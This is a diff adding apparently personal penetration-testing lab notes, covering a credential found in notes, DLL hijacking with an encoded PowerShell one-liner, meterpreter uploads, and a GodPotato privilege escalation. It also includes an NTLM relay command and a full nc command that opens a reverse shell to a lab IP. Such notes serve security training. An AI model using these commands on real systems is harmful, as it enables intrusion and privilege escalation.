@@ -86,3 +86,15 @@ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.221.212 -c "po
 ### 15.3.4.2
 
 same as above with command injection
+
+### 16.3.2.2
+
+Found alex password in notes
+Found enterpriseservice
+placed dll in the folder with powershell one line base64 encoded, meterpreter payload was not working
+got reverse connection
+uploaded meterpreter exe
+uploaded god potato and executed nc 
+GodPotato-NET4.exe -cmd "C:\Services\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.186 1234"
+
+
